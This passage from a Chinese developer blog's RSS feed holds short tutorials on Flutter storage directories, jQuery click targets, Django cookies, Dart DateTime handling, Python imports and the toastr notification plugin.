&lt;p&gt;此目录的特点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当应用卸载的时候，这些数据也会被删除，避免垃圾文件。&lt;/li&gt;
&lt;li&gt;不需要申请额外权限。&lt;/li&gt;
&lt;li&gt;空间大且不会被系统清除，通过 设置 中的 清除数据 可以清除此目录数据。&lt;/li&gt;
&lt;li&gt;用户可以直接对文件进行删除、导入操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;c总结&#34;&gt;c.总结&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;SharePreferences 和 sqlite  数据建议存放在内部存储，插件已经帮我们完成了，无需手动处理。&lt;/li&gt;
&lt;li&gt;严格保密的数据，比如用户数据，建议存放在内部存储，对应 getApplicationSupportDirectory 方法。&lt;/li&gt;
&lt;li&gt;其余所有的数据建议存放 Android/data/包名/ ，对应 getExternalCacheDirectories 和 getExternalStorageDirectories 方法。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Web开发—定位点击位置</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E5%AE%9A%E4%BD%8D%E7%82%B9%E5%87%BB%E4%BD%8D%E7%BD%AE/</link>
        <pubDate>Sat, 05 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E5%AE%9A%E4%BD%8D%E7%82%B9%E5%87%BB%E4%BD%8D%E7%BD%AE/</guid>
        <description>&lt;h2 id=&#34;1实现&#34;&gt;1.实现&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;body&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;click&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;even&lt;/span&gt;) { 
    &lt;span style=&#34;color:#75715e&#34;&gt;// 在页面任意位置点击而触发此事件
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// even.target 表示被点击的目标
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;even&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;target&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;attr&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;))
})
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Django—cookie处理</title>
        <link>https://ac-lm.github.io/posts/django/djangocookie%E5%A4%84%E7%90%86/</link>
        <pubDate>Fri, 04 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/django/djangocookie%E5%A4%84%E7%90%86/</guid>
        <description>&lt;h2 id=&#34;1设置-cookie&#34;&gt;1.设置 cookie&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 编写视图函数，进行设置&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; datetime &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; datetime,timedelta
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;set_cookie&lt;/span&gt;(request):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;设置cookie&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
    response &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; HttpResponse(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;设置cookie&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39; max_age 设置过期时间，单位是秒 &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;# response.set_cookie(&amp;#39;name&amp;#39;, &amp;#39;tong&amp;#39;, max_age=14 * 24 * 3600)&lt;/span&gt;
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39; expires 设置过期时间，是从现在的时间开始到那个时间结束 &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;set_cookie(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tong&amp;#39;&lt;/span&gt;, expires&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;datetime&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;now()&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;timedelta(days&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; response
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2获取cookie&#34;&gt;2.获取cookie&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 视图函数中定义  get_cookie 方法&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_cookie&lt;/span&gt;(request):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;获取cookie&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;COOKIES[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;]
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; HttpResponse(name)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Flutter—时间</title>
        <link>https://ac-lm.github.io/posts/flutter/flutter%E6%97%B6%E9%97%B4/</link>
        <pubDate>Fri, 04 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutter%E6%97%B6%E9%97%B4/</guid>
        <description>&lt;h2 id=&#34;1时间&#34;&gt;1.时间&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; today &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; DateTime.now();
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;当前时间是：&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;today&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;);

&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; date1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; today.millisecondsSinceEpoch;
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;当前时间戳：&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;date1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;);

&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; date2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; DateTime.fromMillisecondsSinceEpoch(date1);
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;时间戳转日期：&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;date2&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;);

&lt;span style=&#34;color:#75715e&#34;&gt;// 拼接成 date
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; dentistAppointment &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; DateTime(&lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;);
print(dentistAppointment);

&lt;span style=&#34;color:#75715e&#34;&gt;// 字符串转 date
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;DateTime date3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; DateTime.parse(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-06-20 15:32:41&amp;#34;&lt;/span&gt;);
print(date3);

&lt;span style=&#34;color:#75715e&#34;&gt;// 时间比较
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(today.isBefore(date3));&lt;span style=&#34;color:#75715e&#34;&gt;// 在之前
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(today.isAfter(date3)); &lt;span style=&#34;color:#75715e&#34;&gt;// 在之后
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(date3.isAtSameMomentAs(date3));&lt;span style=&#34;color:#75715e&#34;&gt;// 相同
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(date3.compareTo(today));&lt;span style=&#34;color:#75715e&#34;&gt;// 大于返回1；等于返回0；小于返回-1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// 时间增加
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; fiftyDaysFromNow &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; today.add(&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Duration(days: &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;));
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;today加5天：&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;fiftyDaysFromNow&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;);

&lt;span style=&#34;color:#75715e&#34;&gt;// 时间减少
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;DateTime fiftyDaysAgo &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; today.subtract(&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Duration(days: &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;));
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;today减5天：&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;fiftyDaysAgo&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;);

&lt;span style=&#34;color:#75715e&#34;&gt;// 时间差，两个时间相差，小时数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;比较两个时间差，小时数：&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;fiftyDaysFromNow.difference(fiftyDaysAgo)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;);
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;本地时区简码：&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;today.timeZoneName&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;);
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;返回UTC与本地时差 小时数：&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;today.timeZoneOffset&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;);
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;获取年月日：&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;today.year&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;);&lt;span style=&#34;color:#75715e&#34;&gt;// month、day、hour、minute、second、millisecond、microsecond
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;星期：&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;today.weekday&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;);&lt;span style=&#34;color:#75715e&#34;&gt;// 返回星期几
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—import</title>
        <link>https://ac-lm.github.io/posts/python/pythonimport/</link>
        <pubDate>Fri, 04 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonimport/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考：&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/63143493&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Python中import的用法  @门书生 &lt;/a&gt; &amp;amp;  &lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/348559778&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 聊聊Python Import System？@没有50CM手臂 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;a基本概念&#34;&gt;A.基本概念&lt;/h2&gt;
&lt;h3 id=&#34;1-什么可以被-import&#34;&gt;1. 什么可以被 import?&lt;/h3&gt;
&lt;p&gt;因为 Python 中一切都是对象，都属于 object，所以任何东西都可以被 import，在这些不同的对象中，我们经常使用到的结构是模块Module 和包 Package。它们在 Python 的底层都是以 PyModuleObject 的结构体实例存在的，类型为 PyModule_Type，而在 Python 中则表现为一个对象 &lt;code&gt;&amp;lt;class &#39;module&#39;&amp;gt;&lt;/code&gt; 。&lt;/p&gt;
&lt;h4 id=&#34;11-模块module&#34;&gt;1.1 模块（Module）&lt;/h4&gt;
&lt;p&gt;Python 中，不管是对常见的&lt;code&gt;.py&lt;/code&gt;文件，或是编译优化的&lt;code&gt;.pyc&lt;/code&gt;，&lt;code&gt;.pyo&lt;/code&gt;文件、扩展类型的&lt;code&gt;.pyd&lt;/code&gt;，&lt;code&gt;.pyw&lt;/code&gt;文件来说， 它们是属于 Python 代码载体的最小单元，这样单独存在的文件我们都称之为模块。&lt;/p&gt;
&lt;h4 id=&#34;12-包package&#34;&gt;1.2 包（Package）&lt;/h4&gt;
&lt;p&gt;上述这样的多个模块组合在一起，我们就称之为包。通常来说，创建包的步骤都是这样的：首先新建一个目录，然后新建&lt;code&gt;__init__.py&lt;/code&gt;，最后再编写模块。这种包被称为 Regular packages。&lt;/p&gt;
&lt;h3 id=&#34;2-import-的方式--绝对导入与相对导入&#34;&gt;2. import 的方式 ？ 绝对导入与相对导入&lt;/h3&gt;
&lt;h4 id=&#34;21-绝对导入&#34;&gt;2.1 绝对导入&lt;/h4&gt;
&lt;p&gt;绝对路径要求我们必须从最顶层的文件夹开始，为每个包或每个模块提供出完整详细的导入路径&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; package1 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; mudule1
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; package1.module2 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Fx
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; package2 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Cx
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; package2.subpackage1.module5 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Fy
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;22-相对导入&#34;&gt;2.2 相对导入&lt;/h4&gt;
&lt;p&gt;相对导入则要求我们给出相对与当前位置，想导入资源所在的位置。另外，相对导入又分为隐式相对导入和显式相对导入两种，比如我们想在&lt;code&gt;package2/module3.py&lt;/code&gt;中引用&lt;code&gt;module4&lt;/code&gt;模块，我们可以这么写&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# package2/module3.py&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; module4 &lt;span style=&#34;color:#75715e&#34;&gt;# 隐式相对导入&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; . &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; module4 &lt;span style=&#34;color:#75715e&#34;&gt;# 显式相对导入&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; package2 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; module4 &lt;span style=&#34;color:#75715e&#34;&gt;# 绝对导入&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;代码中&lt;code&gt;.&lt;/code&gt;表示当前文件所在的目录，如果是&lt;code&gt;..&lt;/code&gt;就表示该目录的上一层目录。可以看出，隐式相对导入相比于显式相对导入无非就是隐含了当前目录这个条件，不过由于这样会容易引起混乱，所以在 &lt;a class=&#34;link&#34; href=&#34;https://link.zhihu.com/?target=https%3A//www.python.org/dev/peps/pep-0328/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PEP 328&lt;/a&gt; 的时候被正式淘汰。&lt;/p&gt;
&lt;p&gt;注意在跨多个文件导入包时，需注意相对导入寻找相对位置的算法是基于&lt;code&gt;__name__&lt;/code&gt;和&lt;code&gt;__package__&lt;/code&gt;变量的值。大部分时候，这些变量不包含任何包信息。比如：当&lt;code&gt;__name__=__main__&lt;/code&gt;，&lt;code&gt;__package__=None&lt;/code&gt;时，Python 解释器不知道模块所属的包。在这种情况下，相对引用会认为这个模块就是顶级模块，而不管模块在文件系统上的实际位置。&lt;/p&gt;
&lt;h2 id=&#34;bimport的机制&#34;&gt;B.import的机制&lt;/h2&gt;
&lt;p&gt;调用关键字&lt;code&gt;import&lt;/code&gt;的时候主要会触发两个操作：&lt;strong&gt;搜索&lt;/strong&gt;和&lt;strong&gt;加载&lt;/strong&gt;（也可以理解为搜索模块在哪里和把找到的模块加载到某个地方）&lt;/p&gt;
&lt;h3 id=&#34;1-搜索&#34;&gt;1 搜索&lt;/h3&gt;
&lt;p&gt;Python 会在两个地方寻找这个模块，第一是&lt;code&gt;sys.path&lt;/code&gt;（通过运行代码&lt;code&gt;print(sys.path)&lt;/code&gt;查看），第二个地方就是运行文件所在的目录。&lt;/p&gt;
&lt;h3 id=&#34;2-加载&#34;&gt;2 加载&lt;/h3&gt;
&lt;h4 id=&#34;21-import&#34;&gt;2.1 import&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; a
print(type(a))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;打印&lt;code&gt;&amp;lt;class &#39;module&#39;&amp;gt;&lt;/code&gt;，上述代码加载的是一个模块对象，使用的是另一个模块的内存，其运行逻辑如图&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051041367.jpg&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051041367.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;22-fromimport&#34;&gt;2.2 from&amp;hellip;..import&amp;hellip;&amp;hellip;&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; zx
print(type(zx))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;打印&lt;code&gt;&amp;lt;class &#39;method&#39;&amp;gt;&lt;/code&gt;，加载的是方法，直接将内容复制一份，使用自己的内存，其运行逻辑如图&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051041731.jpg&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051041731.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Web开发—jQuery 消息提示插件 toastr</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91jquery-%E6%B6%88%E6%81%AF%E6%8F%90%E7%A4%BA%E6%8F%92%E4%BB%B6-toastr/</link>
        <pubDate>Fri, 04 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91jquery-%E6%B6%88%E6%81%AF%E6%8F%90%E7%A4%BA%E6%8F%92%E4%BB%B6-toastr/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考文献： &lt;a class=&#34;link&#34; href=&#34;https://github.com/CodeSeven/toastr&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; github-toastr @CodeSeven &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;toastr 是一个基于 jQuery 简单、漂亮的消息提示插件，使用简单、方便，可以设置超时时间自动消失。&lt;/p&gt;
&lt;h2 id=&#34;1引入-toastr-的-jscss-文件&#34;&gt;1.引入 toastr 的 js、css 文件&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;%=path%&amp;gt;/res/toastr/toastr.min.js&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;link&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rel&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;%=path%&amp;gt;/res/toastr/toastr.min.css&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2使用&#34;&gt;2.使用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 常规消息提示，默认背景为浅蓝色  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toastr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;info&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;你有新消息了!&amp;#34;&lt;/span&gt;);  

&lt;span style=&#34;color:#75715e&#34;&gt;// 成功消息提示，默认背景为浅绿色 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toastr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;success&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;你有新消息了!&amp;#34;&lt;/span&gt;);  

&lt;span style=&#34;color:#75715e&#34;&gt;// 警告消息提示，默认背景为橘黄色 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toastr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;warning&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;你有新消息了!&amp;#34;&lt;/span&gt;);  

&lt;span style=&#34;color:#75715e&#34;&gt;// 错误消息提示，默认背景为浅红色 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toastr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;你有新消息了!&amp;#34;&lt;/span&gt;);  

&lt;span style=&#34;color:#75715e&#34;&gt;// 带标题的消息框
